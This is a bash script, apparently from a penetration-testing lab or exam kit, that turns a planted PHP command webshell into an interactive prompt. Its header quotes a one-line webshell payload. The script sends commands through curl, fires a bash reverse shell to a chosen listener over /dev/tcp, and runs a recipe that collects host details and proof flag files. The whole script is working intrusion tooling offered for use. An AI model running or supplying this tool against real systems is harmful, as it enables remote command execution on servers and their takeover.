#!/usr/bin/env bash
# webshell — turn a dropped command webshell (e.g. <?php system($_GET[0]);?>) into
# a usable prompt. You type commands; it URL-encodes, sends, prints output.
# Works for GET (?param=cmd) or POST (param=cmd). No framework, just curl.
#
# Usage:
#   ./webshell.sh <shell-url> [param] [GET|POST]
#   ./webshell.sh <shell-url> [param] [GET|POST] -c '<one command>'   # non-interactive
#
# Examples:
#   ./webshell.sh http://target/extramile/s.php 0 GET
#   ./webshell.sh http://target/up/s.php cmd POST
#
# At the prompt:
#   <any shell command>        run it
#   !rev <ip> <port>           fire a bash reverse shell to your listener
#   !proof                     run the proof-gathering recipe (id/hostname/local/proof)
#   !q                         quit
set -uo pipefail
URL="${1:?usage: webshell.sh <shell-url> [param] [GET|POST] [-c cmd]}"
PARAM="${2:-0}"
METHOD="${3:-GET}"
ONESHOT=""
[ "${4:-}" = "-c" ] && ONESHOT="${5:-id}"

run(){ # $1 = command string
  local cmd="$1" resp
  if [ "$METHOD" = POST ]; then
    resp=$(curl -s --max-time 30 "$URL" --data-urlencode "$PARAM=$cmd")
  else
    resp=$(curl -s --max-time 30 -G "$URL" --data-urlencode "$PARAM=$cmd")
  fi
  printf '%s\n' "$resp"
}

PROOF='echo "=== id ==="; id; echo "=== host ==="; hostname; (ip a 2>/dev/null || ipconfig 2>/dev/null); echo "=== local.txt ==="; cat local.txt 2>/dev/null; find / -maxdepth 4 -name local.txt 2>/dev/null -exec cat {} \; ; echo "=== proof.txt ==="; cat /proof.txt /root/proof.txt 2>/dev/null; find / -maxdepth 4 -name proof.txt 2>/dev/null -exec cat {} \;'

do_cmd(){
  case "$1" in
    "!q"|"!exit") exit 0 ;;
    "!proof") run "$PROOF" ;;
    "!rev "*) set -- $1; local ip="$2" port="$3"
              echo "[*] start a listener first:  nc -lvnp $port"
              run "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" ;;
    *) run "$1" ;;
  esac
}

echo "[*] webshell @ $URL  (param=$PARAM, $METHOD).  Checking..."
if ! run 'id' | grep -qiE 'uid=|gid='; then
  echo "[!] no 'uid=' in response — check URL/param/method (and that the shell exists)."
fi
if [ -n "$ONESHOT" ]; then do_cmd "$ONESHOT"; exit 0; fi

while true; do
  printf 'ws$ '; IFS= read -r line || break
  [ -z "$line" ] && continue
  do_cmd "$line"
done
